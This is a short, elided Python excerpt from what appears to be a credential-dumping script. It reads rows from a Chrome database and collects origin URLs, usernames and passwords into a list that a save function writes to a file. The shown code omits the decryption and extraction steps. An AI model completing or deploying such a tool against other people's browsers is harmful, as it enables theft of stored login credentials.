...
def saveData(lst: list) -> None:
    '''
    Write the data on a file
    Parameters:
        lst (list): list of data contained in chrome database
...
def main():
    ...
    for row in cursor.fetchall():
        ...
        if username or password:
            lst_data.append("Origin URL: " + origin_url)
            lst_data.append("Action URL: " + action_url)
            lst_data.append("Username: " + username)
            lst_data.append("Password: " + password)
